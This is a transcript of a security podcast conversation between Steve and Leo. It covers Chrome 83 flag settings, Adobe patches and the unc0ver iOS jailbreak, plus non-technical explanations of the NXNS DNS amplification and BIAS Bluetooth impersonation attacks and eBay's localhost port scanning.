Anyway, they've moved Clear Browsing Data control for doing that to the top of the Privacy & Security setting, although I also noticed you can get to it even quicker through the More Tools pop-up menu off of the main menu.  But any event, so Chrome also offers a new safety check feature which provides a number of services.  It will tell its user if the passwords Chrome is storing have been compromised; and, if so, how to fix them.  It will flag whether their own safe browsing technology is enabled and operating, or might have been turned off.  You might have forgotten about it for some reason.  It'll verify that the version of Chrome you're running is up to date and whether any malicious extensions are installed.  It will tell you how and where to remove them.



The only problem, as I said, is with all of these things we're going to be talking about, it's not turned on.  So you'll be going a lot to chrome://flags.  That brings you to an unbelievably long list of settings.  Now, Firefox has the same thing.  It's useless, there are so many things there, without the search box.  Fortunately there is one.  So chrome://flags.  And then in the search box put "privacy."  What you'll find there is Privacy Settings Redesign, which is what they're calling it in this not-yet-released incarnation.  So you want to switch it from default, which someday maybe default on - right now it's default off - and turn it to enable.  Then it will, down in the lower right, a big relaunch thing will light up.  You want to click that.  It briefly shuts down and restarts Chrome.  And then this new Safety Check option that wasn't there before appears.



I clicked Check Now, which is the big blue button, and I ran a check.  I got all four checkmarks indicating that the things Chrome had just checked for me were all okay.  So it doesn't feel like it's a big in-depth thing that it's doing.  Maybe they'll add more stuff there in the future.  They've got lots of room for it.  So that would make sense.  Also with this release of Chrome, Google has started blocking, and this was nice to see because Safari's the only browser that's ever done this, and I've never understood it, started blocking third-party cookies by default, not globally, but at least in Incognito mode.  And because they wanted to make sure, I guess they feel this is an aggressive thing to do, there's a big banner you get in Incognito mode after once again you have turned it on.



So back at the chrome://flags page, this time you search for "improved cookie controls."  That will find for you that item which you set to Enable, restart Chrome, and then go to the Incognito mode, which is all dark, assuming that your normal browsing is white, as mine still is, or light.  And you get a little description of what Incognito mode is, followed by this banner: "Block third-party cookies.  When on, sites can't use cookies that track you across the web."  Sounds great.  Let's have everybody turn on always for all browsers.  But no.



Anyway:  "Features on some sites may break," they say.  So there's a switch there, and it's on by default.  Anyway, new feature, thank you very much.  I don't know if you have to enable the cookie control for that to be the case.  I think you probably do because it's called - it's not just UI, it's Improved Cookie Controls.  I don't know whether Incognito mode always had third-party cookie support turned off, or if it's on and now you can more easily see it.



There's also an Extensions Toolbar Menu.  When enabled, it adds a little puzzle piece icon to the right of the group of extensions that you may already have displaying in Chrome, to create a quick-access dropdown for managing those extensions and their management.  So again, Chrome flags page.  And if you search for "extensions toolbar menu," you'll find it.  Turn it on, restart Chrome, now you get the puzzle piece.  And when you click on it, you get a cool little dropdown that allows you to more quickly access your extensions.  Otherwise, you know, you go through the traditional menu, extensions, and then it takes you to a whole page.  This is just kind of a little quickie.



Oh, and it did, in the sample that I have in the show notes, I was on a page that was not engaging any extensions.  But I later tried it somewhere else, and it showed me which extensions had been activated by that page.  That is, LastPass came up and said, yeah, I got some form fill stuff.  And uBlock Origin, that's the other extension that I run, came up and said, oh, I just blocked 49 things.  So it's like, thank you, uBlock.  Anyway, cool little app.  Of course, those things both show those items in their little widget tabs on the toolbar.  So just another way of getting to extensions.



And the other UI improvement is the much-anticipated Tab Groups feature.  Again, as with all these things, you've got to turn it on before you get it.  So you want to search for "tab groups."  That'll bring up three related tab group things.  There's Tab Groups, which they say allows users to organize tabs into visually distinct groups, create separate tabs associated with different tasks.  There's Tab Groups Collapse, which you have to separately enable, which allows the group to be collapsible and expandable.  It's funny, because I tried that.  And I put some tabs in a group, and then I said, yeah, collapse them.  And everything went away.  I mean, there wasn't anything left.  There was no little hook to, like, get it back.  And I thought, oh, okay.



LEO:  It really collapsed.



STEVE:  It really collapsed...



LEO:  It collapsed out of the universe.



STEVE:  ...the entire experience, yes, into the Tab Group black hole.  Anyway, right-clicking somewhere on the bar gave me the option to get them back.  And I thought, whew, okay, they're not gone forever.  That's good.  And they've done some nice things.  They assign colors to the group.  You can label the group.  And then the tabs that are collected to the right of the group name, they have separate color highlighting.  I mean, it's very pretty from a UI standpoint.



I don't use Chrome as my main browser.  I'm still using Firefox with its wonderful vertical tab column that I just can't get away from.  So I sort of use Chrome for smaller stuff.  So I'm not needing to manage tabs.  And I will say, sorry, Google, horizontal tabs are wrong.  The moment people see Edge, where you can click on a little button in the upper left, and the tabs go vertical, it's the end of horizontal tabs across the galaxy.  They will just cease to exist because they are fundamentally wrong.



LEO:  You really like those, don't you.



STEVE:  Just wait.  I mean, it's just like it's so much - it's obviously better.  The tabs are - they take up horizontal space.  Here's Google trying to shorten our URLs by removing arguably important things from them.  But no, the tabs stay horizontal.  It's like, okay, well, we'll see about that.



The good news is the Google UI person - no, no, no, I'm sorry, I'm confusing companies.  It's Microsoft's Edge guy is in love with vertical tabs because he knows what's right, just inherently, intrinsically.  Anyway, yeah, enough said.  You can now Group Tab.



LEO:  This theory is because we have wide screens, so there's more room on the left than there is on the top?  Is that the idea?  Why is it that you like these vertical tabs?



STEVE:  Well, Leo, when you have a hundred...



LEO:  That's why.  You can't fit them in this way.  You can only fit them in that way.



STEVE:  And if you squeeze them, then you can't read them anymore.  



LEO:  You can't read them.  It's just like one letter.



STEVE:  I mean, they're just wrong.



LEO:  Yeah, yeah, yeah.



STEVE:  It's just wrong.



LEO:  No, that makes sense.



STEVE:  To be across the top.  It's so obvious.



LEO:  Can you get a hundred vertically?



STEVE:  Well, I have a scroll bar.



LEO:  Oh, wow.  So you have so many tabs that you actually scroll them.  Wow.



STEVE:  It's wonderful.  It's just wonderful.  Wait.  The world will see.  When Edge has that button, we're going to be on here.  I'm going to say, "Now, Leo, I want you to reach up to the upper left corner and press that little button that you've never pressed."  And you're going to go [gasp].  And I'll go, "Uh-huh.  That's what I'm talking about."



LEO:  You know, I just don't keep that many tabs open.  So it probably doesn't matter to me.  I do pin tabs.  I love pinned tabs.  But that's only for stuff I don't change around a lot.  I don't know. 



STEVE:  I have some of those, too.



LEO:  Yeah, I'm not a big - you're a tab guy.  



STEVE:  Yeah.  I'm kind of a messy desk person.  So I've got this little tray along the top of my keyboard.  And it's just got...



LEO:  With paper clips.  Old Lifesavers.



STEVE:  It just, likes, grows paraphernalia.  Yeah.  I've got like a little pushbutton, a little micro pushbutton.



LEO:  Yeah, you might need that someday.



STEVE:  I've got an SD card for some reason, a microSD.



LEO:  Okay, I get it now.



STEVE:  And I have a little surface mount speaker.  And anyway...



LEO:  But I have to point out, that tray is a horizontal tray.  You wouldn't want a vertical one of those.



STEVE:  Ah, you got me.  That's true.  Although I do have my function keys on the left.



LEO:  Oh, wow.  Where did you get that keyboard?



STEVE:  My function keys are vertical, old-school.



LEO:  You have an old IBM keyboard?



STEVE:  Northgate OmniKey 102 with the function keys where they're supposed to be.



LEO:  Oh, man.



STEVE:  They are not supposed to be across the top.  They're supposed to be running down there in two rows, or two columns on the left.  And I lost that battle completely.



LEO:  Yup.  And the floppy disk is supposed to be right in the front there, the floppy.  None of these little 1.5-inch whatever they are.  The nice big 5.25-inch floppy.  That's what we want, yeah.  All right.



STEVE:  Lastly.  The good news is on the Chrome flags you can type in "secure DNS" and enable Chrome's DNS over HTTPS, a.k.a. DoH.  Remember that until it appeared in the UI, the way you had to do that was by adding a bunch of command line switches to the icon that launched your instance of Chrome.  So this is way better than that.  So that turns it on.  And apparently it's going to work the same way as Windows 10 will when we get that DoH in Windows 10, which is if your system is set up to use a DNS provider that offers DoH, Chrome, when this is enabled, will just use DoH instead.  So yay to that.



Oh, and as we know, back with Chrome, speaking of shortening the URL, with 79, that's when Chrome or Google pivoted back to deciding that displaying the http:// at the front of every URL is not useful.  And more than that, that the "www" or the "m," which of course is for mobile subdomain, that you just don't need those.  And as the person who did the write-up of this "bug," as it was called, said, they're better off being elided from the screen, so declaring that they were trivial subdomains.



With 83, as promised, those of us who are sticklers for details have reobtained the ability to display the full, unadulterated, unelided URL.  We need to jump through a few hoops, but that's fine.  You go to the chrome://flags and search for "omnibox context."  That will find an item, "Context menu show full URLs."  Got to turn it on because you wouldn't want to confuse people with an omnibox dropdown that didn't offer that option.  Oh, my goodness, they might turn it on by mistake.  So no, enable it first, then restart Chrome because, oh, have to do that.  Then, yes, you can right-click in the URL field, and the last item there, mine now has a checkbox next to it, not surprisingly, that brought back my "www" and the https:// that has long been gone from Chrome.



LEO:  Oh, thank goodness.



STEVE:  So thank you, Google.



LEO:  Yes.



STEVE:  That really wasn't so hard; was it?  No.



LEO:  No.



STEVE:  Adobe surprised us last week with four out-of-cycle emergency updates.  So if you were using Adobe's Character Animator, Premiere Pro, Audition, or Premiere Rush, they felt so strongly about these four vulnerabilities, one for each, that they broke with their normal monthly - and it was just a week before.  They normally follow Microsoft with a second Tuesday bumper crop, is what they had two weeks ago.  They thought, oh, we'd better get this one out there.  Because somehow their Character Animation app has a remote code execution flaw.  And you've really got to wonder what in the world they're doing for a character animation tool to have a remote code execution vulnerability.  But that's Adobe.



In any event, any of our listeners who are using them, any of those four apps, will want to check to make sure that they are updated with the current because they're all - one was remote code.  The other was a worrisome information disclosure, as I recall.  Or it might have been an elevation of privilege.  I don't remember because I just got stuck on that how can character animation have remote code execution.  But in any event, it does.



There's an iOS jailbreak that has just dropped.  And of all the jailbreaks I've seen, this is the nicest and most professional that I've ever seen done.  It really looks very nice.  And of course it's time, this is a strictly time-limited offer because Apple's going to fix this any minute.  So if you're moved to explore an iOS jailbreak and never have before, I would argue that this is the way to go, this one.  And so it leverages a previously unknown zero-day flaw in, get this, every version of iOS from 11.0 through 13.5, which is where we are today, with two curious little exceptions.  It doesn't work on 12.3 through 12.3.2, nor on 12.4.2 through 12.4.5.  Those are excluded.  Don't know why.  But that means, since it goes from 11 to 13, it would work on the original iPhone 6s through today's latest iPhone 11 Pro Max.



And, I mean, it really has the feel of a professional jailbreak.  I've never been tempted to do that.  I heard you talking about this on MacBreak Weekly, Leo, and I agree with you.  There's just, you know, yes, and I agree with Andy.  It would be nice to have a better launcher.  My biggest gripe with - I don't mean to diverge, but - with iOS is that I'll have so many apps that I don't know where they are.  And I'll go through the pages looking for it.  



LEO:  Yeah.



STEVE:  And I can't find it.  So I finally go, okay, fine.



LEO:  I'll do the search.



STEVE:  So I pull down, go to search, type in a couple characters, and it finds it.  



LEO:  Most long-term...



STEVE:  But it just shows it to me...



LEO:  I know.



STEVE:  ...in the menu.



LEO:  It doesn't show where it is.



STEVE:  It doesn't help me know where it is.  It's so annoying.



LEO:  It used to show you the folder it was in.  I know.  They took that feature out.  It used to say it's in this folder.  And they took that out.  I think that a lot of people just use the search mode.  That's it.  They just go, I don't know where it is.  I'm going to pull it down.  I actually organize everything into named folders, logical folders.  But it's a terrible system.



STEVE:  And I saw yours, Leo.  All of them had red things on them because... 



LEO:  Yeah, that's annoying, too.



STEVE:  ...inside every one of the folders...



LEO:  Notifications.



STEVE:  ...there's something screaming for your attention.



LEO:  Yeah.  I have to go through everything and turn off all the notifications, which is a pain.  Yeah.  It's primitive.  It's not much changed since 2007.  But at the same time, here's my real question about jailbreaks.  I mean, yeah, it's professional, all that.  But a jailbreak always means they have to take advantage of a security flaw; right? 



STEVE:  Yes.  This is a zero-day flaw which they will - because, I mean, Apple doesn't want anybody to do this.



LEO:  Right.



STEVE:  That's why it's a big deal.  It's a jailbreak.  If it was just a walk-in, then it wouldn't be a big deal.



LEO:  Right, right.



STEVE:  Okay.  So remember that CheckM8, also known as Checkrain, that jailbreak leveraged a flaw in earlier physical devices' boot ROM which allowed a single boot duration takeover of iOS.  And that one worked on iPhones from 4s through iPhone 10.  And because it was leveraging a flaw that was discovered in the boot ROM, those hardware platforms can never be fixed.  Everybody will be able to use that who wants to on iPhones up from 4s up through 10.  But not afterwards because Apple fixed the problem with iPhone 11.  It's called the "Unc0ver," U-N-C-0-V-E-R.  And anyone who's interested, unc0ver.dev is the site with 0 of cover being a numeric zero.  I hope they grabbed the other one if it was available and bounced it over to the hacker spelling version.



So if you're curious to play with a jailbreak - and again, there's really not much you can do, as you said, other than download apps from non-Apple Store places, and that's of course fraught with risk.  But the site explains that it's very compatible - they tested it on a gazillion devices - and very stable.  They explain, they said:  "Utilizing proper and deterministic techniques, jailbreak stability is guaranteed."  They also claim security:  "Utilizing native system sandbox exceptions, security remains intact while enabling access to jailbreak files."  Meaning apps.



And under "Extensively Tested" they write:  "Unc0ver has been extensively tested to ensure it's a seamless experience on all devices.  Unc0ver works on all devices on iOS versions between 11.0 and 13.5.  Below you can find a list of all devices that have been specifically tested."  And, boy.  When you click that "Show me the devices," it opens up a really long list of things that they've verified.



So anyway, they're very proud of this work.  And they had something under "Important Information" that I thought it was important enough to share.  So they explained that it's been "stable and enable freedom from the moment you jailbreak your device.  Built-in runtime policy softener allows running code without Apple's notarization and pervasive restrictions.  Proper runtime modifications to iOS kernel modify security features as necessary and result in..." and then they've got a number of things they're proud of.  "No extra security vulnerabilities:  Unc0ver preserves security layers designed to protect your personal information and your iOS device by adjusting them as necessary instead of removing them.  With this security adjusted on your iOS device, you can run your favorite jailbreak apps and tweaks while still being protected from attackers.



"Stability and battery life:  Unc0ver is tirelessly developed and rigorously tested with software stability and battery life in mind.  If you're experiencing issues with stability or battery life, we recommend searching your device for faulty tweaks.  Reconciliation of services:  Services such as iCloud, iMessage, FaceTime, Apple Pay, Visual Voicemail, Weather, and Stocks have been reconciled and still work on the device."  So other things don't break.



"Future software updates" - and this is a little confusing.  They said:  "The ability to apply future updates is retained.  Modifications to iOS kernel are done in memory.  This results in the jailbroken iPhone, iPad, or iPod Touch staying operable when a future Apple-supplied iOS update is installed."  However, for iOS updates, they note:  "Unc0ver Team strongly cautions against installing any iOS software update that breaks Unc0ver" - well, as the next one is sure to, 13.5.1 - "as you can't re-jailbreak on versions of iOS that are not supported" - yeah, there's a euphemism for you - "by Unc0ver at that time."



And then, finally, "Jailbreak legality:  It is also important to note that iOS jailbreaking is exempt and legal under DMCA.  Any installed jailbreak software can be uninstalled by re-jailbreaking with the restore root file system option to take Apple's service for an iPhone, iPad, or iPod Touch that was previously jailbroken."



So anyway, I'm very impressed.  If you were ever thinking of playing with a jailbreak, I would argue this is the one.  These guys really did a nice job of essentially doing nothing more than allowing you to use un, as they put it, notarized apps, unsigned apps, and only being able to purchase them through the Apple Store.  So I'm not promoting it.  But you can do the jailbreak under macOS or Windows.  Technically you can use Linux, but you have to have an Apple developer account if you're going to use Linux.  Windows and Mac have methods that don't require that.



And in related news, I'll note that the zero-day exploit broker whom we've referred to often, Zerodium, 14 days ago tweeted, on the 13th of May, that they would not be purchasing iOS remote code execution vulnerabilities for the next few months due to "a  high number of submissions related to these vectors."  They said, in other words, or I'm saying in other words, there's apparently a bit of a market glut in iOS remote code execution.  Or perhaps it's that hackers who've been stuck at home for the last few months have had more time on their hands to dig more deeply into iOS and are discovering a few additional gems there.



Okay.  This is really interesting.  Again, what happens when security researchers get very clever is the so-called NXNS attack.  A group of cybersecurity researchers in Israel responsibly disclosed, back in December, to those who needed to know, details about their newly discovered way of using Internet domain name resolution system to hugely amplify, by up to a factor of 1,620 packets - meaning send one out, your victim gets hit with 1,620 in response - a DDoS attack to take down targeted websites.



We're learning of it only now because the many companies who are helping to run their portions of the Internet infrastructure, including PowerDNS, CZ.NIC, Cloudflare, Google, Amazon, Microsoft, Oracle's Dyn, VeriSign, and IBM's Quad9 have all since, they've already patched their software to address this problem.  So basically, problem solved.  But it was a really interesting hack.



So when a DNS lookup is requested, the request is almost always made, if not always made, to what's known as a "recursive DNS resolver."  So like all of the DNS resolvers that we talk to, the ones our ISP provides, typically, to their clients.  When you ask a DNS server for the IP address of a domain name, it goes to a so-called "recursive DNS resolver."  Assuming that the DNS resolver does not already have the IP for the requested domain in its local cache, it will then take on the task on behalf of the user, while the user waits for a reply, of making the requests necessary to track down the IP.



And thus begins, in this case, the vulnerability.  The resolving DNS resolver will first ask one of the top-level authoritative name servers for the IP of the name server that's authoritative for the second-level domain.  So, for example, it will ask one of the many .com name servers for the name server that's authoritative for attacker.com.  If the domain being looked up, say the domain being looked up is noodles.attacker.com, then having obtained the list of name servers from the name server for attacker.com that are authoritative for noodles.attacker.com, that - well, okay, yeah.  



LEO:  No, I like it.  I'm enjoying it.



STEVE:  That recursive name server next asks the name server, one of the name servers that it's been told is authoritative for noodles.attacker.com, for the IP for noodles.attacker.com domain.  And this is the problem.  The attacker.com name server can be malicious.  And it's easy to get, you know, a name server for a domain.  Whatever domain you choose, you can get a name server for it.  It can provide a long list of apparently unique, that is, distinct name servers, and there's no limit to how many name servers you can have.  But in this case they all have the same IP, the IP you want to attack.  At that point, the recursive name server that's trying to give you an answer will begin querying the victim IP, having been told that, yes, that that's where the name server is for the domain.  



LEO:  I'm going to check it again.  Hello?  Talking to you.



STEVE:  Exactly.  That IP knows nothing about this.  So when it either doesn't respond or it responds "Huh?" the user's recursive name server will then try the next fake name server in the list that it received from the malicious attacker.com name server.  And because DNS runs over UDP, and packets can after all get lost, there's lots of retries involved.  



LEO:  Sure, yeah.



STEVE:  The result is a massive traffic amplification attack since there are also, after all, hundreds of thousands of recursive name servers located all over the Internet that are available to be queried to resolve the request.  So the bad guy sets up the malicious name server at attacker.com, which disperses a long list of individual name servers with the IP of its victim.  And then the attacker sprays a request for noodles.attacker.com...



LEO:  All over.



STEVE:  ...to all of the recursive name servers it can find.



LEO:  All over.



STEVE:  And all of them then launch a distributed denial of service attack against that single target victim IP.  And basically it just melts.  So it's a good thing they kept this to themselves because it would be a field day.  The researchers said that the attack can amplify the number of packets exchanged, as I mentioned, by up to 1,620.  They said:  "Our initial goal was to investigate the efficiency of recursive resolvers and their behavior under different types of attack, and we ended up finding a new serious-looking vulnerability, the NXNS Attack."



They said:  "The key ingredients of the new attack are, one, the ease with which one can own or control an authoritative name server; two, the usage of nonexistent domain names for name servers; and, three, the extra redundancy placed within the DNS structure to achieve fault tolerance and fast response time."  They recommended that network admins who run their own DNS servers update their resolver software to the latest version.  And interestingly, when I went looking for additional information, the www.nxnsattack.com site was unreachable, both for it and for the research PDF.  It just timed out.  So maybe they're getting a little of their own medicine at the moment, being DDoSed by someone who's at home and thinks that they wish that had not been solved or fixed.  Who knows?



LEO:  Sigh.  That was a big sigh.



STEVE:  Well, yeah.



LEO:  What's the matter, Steve?



STEVE:  Remember how we said that the Bluetooth pairing event is inherently insecure.



LEO:  Yeah.



STEVE:  Because that's the one moment when two devices having no previous knowledge of one another are negotiating a shared key which they will henceforth share and use to re-recognize one another in the future.



LEO:  Yeah.



STEVE:  And so we said, okay, so like go out into the middle of an empty parking lot if you were really concerned because the distance of Bluetooth is short.  And maybe throw the tinfoil blanket over yourself if you really want to be careful, but probably not necessary.



Well, it turns out, as they say, that may have been necessary.  But even that was not sufficient.  What we have as a result of new research by a group who discovered a means of later performing exactly the sort of impersonation attack that the whole Bluetooth one-time pairing scheme was designed to prevent, is nothing less than a complete collapse of Bluetooth security.  Their abstract of their detailed research paper says Bluetooth (BR/EDR), which we know is the standard Basic Rate/Enhanced Data Rate, essentially the standard communicating Bluetooth protocol, they say, "is a pervasive technology for wireless communication used by billions" - yes, billions - "of devices.



"The Bluetooth standard includes both a legacy authentication procedure and a secure authentication procedure, allowing devices to authenticate to each other using a long-term key.  Both procedures are used during pairing and secure connection establishment to prevent impersonation attacks.  In this paper, we show that the Bluetooth specification" - the specification.  Again, this is not bugs.  This is the spec.



LEO:  This is how it's supposed to be.



STEVE:  This is how it's supposed to do it, kiddies - "contains vulnerabilities enabling impersonation attacks during secure connection reestablishment.  Such vulnerabilities include the lack of mandatory mutual authentication, overly permissive role switching, and an authentication procedure downgrade to the legacy version.  We describe each vulnerability in detail, and we exploit them to design, implement, and evaluate master and slave impersonation attacks on both the legacy authentication procedure and the secure authentication procedure.



"We refer to our attacks as Bluetooth Impersonation AttackS" - using "A" and "S" of AttackS, thus BIAS.  "Our attacks are standards compliant and are therefore effective against" - yes.



LEO:  That's a new one, "standards compliant."



STEVE:  "...any standards-compliant attack."



LEO:  Oh, my god.



STEVE:  We broke no rules implementing this.  Yes.  And "therefore effective against any standards-compliant Bluetooth device..."



LEO:  Oh, this is terrible.



STEVE:  "...regardless of the Bluetooth" - it's terrible, Leo - "Bluetooth version, the security mode, for example, Secure Connections, the device manufacturer, or the implementation details.  Our attacks are stealthy because the Bluetooth standard does not require notifying end users about the outcome of an authentication procedure, or the lack of mutual authentication."



LEO:  [Whimpering]



STEVE:  Right, it's quiet.  "To confirm that the BIAS attacks are practical, we successfully conducted them against 31 Bluetooth devices incorporating 28 unique Bluetooth chips from major hardware and software vendors, implementing all the major Bluetooth versions, including Apple, Qualcomm, Intel, Cypress, Broadcom, Samsung, and CSR.  So the BIAS attacks allow an attacker having knowledge of the Bluetooth address of either endpoint of a previously established connection" - that is, a pairing - "which is trivial to obtain in practice since it's being broadcast all the time, to successfully impersonate that device when reconnecting to the other endpoint."



So, as I said, we have nothing less than a complete and total collapse of Bluetooth's secure authentication.  And what's important to understand, this is not, as I said, the result of any bug.  It's a failure in the design of the Bluetooth standard.  It's a disaster for Bluetooth security.



The researchers tested the attack against smartphones, tablets, laptops, headphones, and even single-board computers including the Raspberry Pi.  Every device was found to be vulnerable to their BIAS attacks.  The standards-setting body, Bluetooth SIG, said it's updating the Bluetooth Core Spec - yeah, no kidding - to "avoid a downgrade of secure connections to legacy encryption."



Here again we see the classic problem of security evolved, but required backwards compatibility.  We saw this in all of the SSL specs over time.  That was one of the early attacks we talked about was where you could pretend you didn't know about TLS v1.1.  It's like, no, I don't know.  And so it's like, oh, well, we'll still connect to you.  And wham, security compromise.



So Bluetooth has the same problem.  They allow a connection that was previously established over a secure connection to not remember that that's the way it was originally connected and thus the devices can connect securely.  There's no flag set for that.  There is in the revised spec, but right now it means it's not there, and so any device can claim ignorance of a secure connection and ask for a legacy less non-secure connection, legacy encryption, in order to get a weaker link.  Which allows the attacker then to initiate a master-slave role switch, placing itself into the master role and becoming the authentication initiator, which then allows it to leverage a couple other problems with the spec.



So in addition to urging companies to apply the necessary patches - there are patches, either in existence or coming.  The Bluetooth SIG is recommending Bluetooth users install the latest updates from device and operating system manufacturers.  So the good news is a lot of this can be fixed in the Bluetooth stack, which can be updated in the field.  The bad news is how many devices are never going to be updated, like the Bluetooth-enabled front door lock that many people have.  Or their Bluetooth-based security system that already has other updates we've talked about that are never going to be fixed.



Anyway, the research team concluded:  "The BIAS attacks are the first, uncovering issues related to Bluetooth's secure connection establishment authentication procedures, adversarial role switches, and Secure Connections downgrades.  The BIAS attacks are stealthy, as Bluetooth secure connection establishment does not require user interaction."  And all of us who use Bluetooth know that.  We're not being annoyed, which is what we would consider it, if every time our pencil gets within the tablet range, something happens.  No.  You do the pairing once.  They learn about each other.  They remember each other.  And then they simply reconnect when they're within range.  Well, unfortunately, if you reconnect with a spoofed other device, nothing tells you.  So it's patchable.  But how many devices are ever going to get patched?



Anyway, important security research, but not good news for Bluetooth.  Hopefully we will see updates for all of our, you know, the OS-supported stack and updates in our devices in order to fix this.  Again, it's not obviously clear what it means for the individual user.  But it's, again, the sort of thing that would just have law enforcement salivating because they're probably thinking, oh, I know exactly how we can use this.



LEO:  Is it theoretically possible you could create a device that would just walk up to a Bluetooth-enabled door lock and open up the door?  Say, yes, I'm Stacy's cell phone.  Hello.



STEVE:  No.  Well...



LEO:  Because there's a PIN; right?



STEVE:  That device needs to have been near Stacy's cell phone in order to get her Bluetooth address.  Then it's able to turn around and pretend to be her cell phone without knowledge of the key.  That's the deal is that it's able to say, I'm Stacy's cell phone.  I don't support the high level of authentication.  We need to use legacy.



LEO:  Right, right.



STEVE:  And I'm going to be the master in this reconnection establishment.  The other end says, oh, okay.  Hi, Stacy.  And then it pretends to impersonate without needing to know what the key is.



LEO:  So this is kind of really on the order of something that a nation-state would use.



STEVE:  Yeah.



LEO:  You'd have to be a target.  I'd have to say, okay, I want to get in that house.  I know it's got this kind of lock.  Let me do some sort of "Bourne Identity" rendezvous with Stacy to get her cell phone cloned.



STEVE:  Exactly.



LEO:  Yeah, yeah, okay.



STEVE:  Yup.  So in a weird piece of news, the headline that I saw was "eBay port scans visitors' computers for remote access programs."  And I thought, huh?  Okay, but it turns out that's not really what's going on.  Kind of.  What is going on is - maybe it's clever.  I don't know.  It doesn't really bother me.  It bothered Lawrence Abrams at BleepingComputer, who wrote about this.  So what's going on is when a user goes to eBay's website to bring up the eBay page, in the process some JavaScript named "check.js" runs on their own browser to internally probe 14 specific ports on their PC at 127.0.0.1, the localhost IP.  It uses the WebSocket protocol that allows that to see whether any of that set of 14 well-known remote control apps - actually it's fewer apps and more ports.  There's, like, four for VNC, four for TeamViewer.  But there's RDP port 3389 is checked.  Four for TeamViewer.  Anyplace Control and AnyDesk and AeroAdmin.  Anyway, it checks for them.



Lawrence, who covered this issue, as I mentioned, on BleepingComputer, he wrote:  "As the port scan is only looking for Windows remote access programs, it's most likely being done to check for compromised computers used to make fraudulent eBay purchases.  Back in 2016, reports were flooding in that people's computers were being taken over through TeamViewer and used to make fraudulent purchases on eBay.  As many eBay users use cookies to automatically log into the site, the attackers, who were able to remote control the computer, were able to access eBay" - that's kind of clever, actually - "to make purchases."



He says:  "It got so bad that one person created a spreadsheet to keep track of all the reported attacks, and many of them referenced eBay."  So he says:  "The script being used for fraud detection is further confirmed by Dan Nemec's great write-up, where he traced it to a fraud detection product owned by LexisNexis called ThreatMetrix.  As part of ThreatMetrix's description, they discuss how they detect and protect sites from Remote Access Trojans."



ThreatMetrix's product page explains:  "Malware protection helps businesses mitigate the risk by being protected from Man-In-The-Browser (MITB), Remote Access Trojan, high velocity and high frequency bot attacks to low and slow attacks mimicking legitimate customer behavior, ransomware, key logging attempts, et cetera."



So he says:  "While the programs being scanned are all legitimate, some of them have been used as Remote Access Trojans in phishing campaigns."  And he concludes:  "Regardless of the reasons, port scans like this are intrusive and not something that many users would want to have happen when visiting a site."  And it's like, well, okay, maybe.  It sounds like it's for the user's own good.  I don't know what happens if you have a server running.  Remember that that doesn't mean that that port which your browser is able to see open is open publicly because it would have to be mapped through a NAT router, which hopefully it's not.  Or maybe TeamViewer uses Universal Plug and Play to open incoming ports to itself.  Who knows?  Anyway, just thought that was interesting.



LEO:  I think it's interesting that JavaScript will tell you that.  I mean...



STEVE:  Yeah.  JavaScript, well, for example, SQRL uses that technique to talk to the SQRL client which is installed in your computer.  So SQRL, the login page connects to the SQRL client on the localhost IP in order to get it to pop up the dialogue asking the user to verify their identity.  And then the client performs the negotiation and provides a token back to the web browser, which immediately cuts out any man in the middle.  So in this instance we were using it to create very strong security.  And Microsoft has talked about cutting browsers off from having local posts or - I've just forgotten the word.  Local...



LEO:  Port?



STEVE:  127.0.0.1.



LEO:  Oh.  IP address?  Localhost.



STEVE:  Localhost.  



LEO:  Okay.



STEVE:  Yeah.  I was just blanking on local.  So cutting browsers off from having access to the user's own local stack.  However, when they tried that, it broke so many things.  It turns out it's very useful to be able to...



LEO:  I can see why you'd need that and be able to query a specific port and say, yeah, okay.  But it just - this is the thing to remember is that these browsers run software, and the software has a lot of capabilities.



STEVE:  Yeah.  Yup.



LEO:  You know?  And this can be...



STEVE:  And we're deliberately giving them more every day because we want them to turn into little app containers.



LEO:  Yeah, that's right.



STEVE:  And actually be apps.  So I got a tweet from Igor Lima, @igorlimatweets.  And I mentioned this.  He said:  "Loved the WiFi history, Steve.  Really appreciate the detail you provided, especially MIMO beam forming and collision detection.  Please continue providing such historical context in future episodes."  And that was sort of a placeholder for me to mention, you already did at the top of the show, Leo, but I got a lot of feedback from who appreciated that.  So I will certainly take that under advisement.



Brian Helman tweeted.  He said:  "I listened to the latest Security Now! today.  Three comments:  I didn't know there was an 802.11 [period, no letter] wireless implementation.  I always thought 802.11a was first.  Doesn't that make 11ax v7, though?"  And so he now goes 11a and then b, then g, then n and ac, then...



LEO:  Starts counting.  Looks like "b" preceded "a," which is really confusing.



STEVE:  Yeah.



LEO:  And that 11 nothing.  But that was so slow, that was 1Mb.  No one used it.



STEVE:  Oh, yes, yes.  It's like, okay.  Why am I using my radio?



LEO:  Yeah.



STEVE:  Anyway, so he said - I mean, he's right.  But, you know, now we have six.  He says:  "Second is I'd have loved to hear why they picked the names the way they did instead of 11, 11a, b, c."  And who know, engineers, IEEE, go figure.



LEO:  And why was it b/a/g?



STEVE:  Yeah exactly.  And what happened...



LEO:  Right?  It wasn't alphabetic.



STEVE:  ...to d, e, and f?



LEO:  Yeah, I know, it was just random.



STEVE:  Yeah.  He says:  "Lastly, you left out the biggest advancement with 11ax, unless I missed it, that we don't use because IoT manufacturers lag so far behind, and that's OFDMA (Orthogonal Frequency Division Multiple Access), allowing sub-channelization to reduce data rates to sub-2Mb."  He says:  "This is HUGE," all caps.  "It keeps low-bandwidth devices from hogging full channels, freeing up space for devices that need the bandwidth."  And he's correct.  I did talk about how with 11ax there were 2,000 separate sub-channels.



I did not talk about what that means is that the access point is able to divide all the bandwidth up to individual clients to prevent client collision.  I talked about that aspect of it.  But it also means, because each of these sub-channels is very low bandwidth, there are all kinds of IoT devices that don't need the full triple-scoop 80Mb bandwidth and are quite happy to just trickle out data at 1Mb.  And so "ax," when our devices all support it - and of course that's the problem is they have to be ax-aware in order to negotiate that.  But in the future they'll be able to just ask for a little sipping straw instead of the big fire hose.  And our systems will work much better as a result.



Liron Amitzi, hope I did that right.  He says:  "Listening to you talk about DoH and wondering, if ISPs start having their own DoH-enabled DNS, wouldn't they still be able to monitor us?  Even if the transport is encrypted, they own the DNS servers.  Am I missing something?"



No.  That is right.  And it's why I expect that before long ISPs will be running their own DoH.  They're going to want not to be cut out from that traffic, it's very clear.  But the privacy-concerned user has the choice to say, no, I'm going to use Cloudflare or Quad9 or whatever, and continue routing their DoH traffic to the DNS server of their choosing.  And someone tweeting as Classy Gay INFJ, he said:  "@SGgrc Hi, Steve.  Can you tell me what this device is?  It looks very familiar.  Thanks."  



LEO:  I know what that is.



